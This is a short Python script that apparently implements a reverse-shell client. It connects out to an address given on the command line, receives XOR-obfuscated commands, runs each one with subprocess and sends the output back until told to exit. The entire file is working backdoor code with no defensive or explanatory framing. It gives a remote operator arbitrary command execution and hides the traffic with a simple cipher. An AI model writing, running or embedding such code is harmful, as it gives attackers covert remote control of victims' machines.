import socket
import subprocess
import sys

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((sys.argv[1], int(sys.argv[2])))

def encode(data):
    res = ""
    k = "1112223334445556".encode()
    for i in range(len(data)):
        res += chr(data[i] ^ k[i % 15])
    return res

while True:
    command = encode(client_socket.recv(102400))
    result = subprocess.getoutput(command)
    client_socket.send(encode(result.encode()).encode())
    if command == 'exit':
        break

client_socket.close()